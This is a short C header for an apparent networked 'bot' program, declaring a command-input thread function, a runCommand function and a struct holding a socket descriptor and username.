#ifndef bot_h
#define bot_h

#include    <stdio.h>
#include    <stdlib.h>
#include    <unistd.h>
#include    <errno.h>
#include    <string.h>
#include    <sys/socket.h>
#include    <sys/types.h>
#include    <sys/ioctl.h>
#include    <netdb.h>
#include    <netinet/in.h>
#include    <net/if.h>
#include    <arpa/inet.h>
#include    <pthread.h>

void *commandInput(void *vargp);
int runCommand(char *command);

typedef struct bot {
    int sd;
    char username[256];
} bot_t;

#endif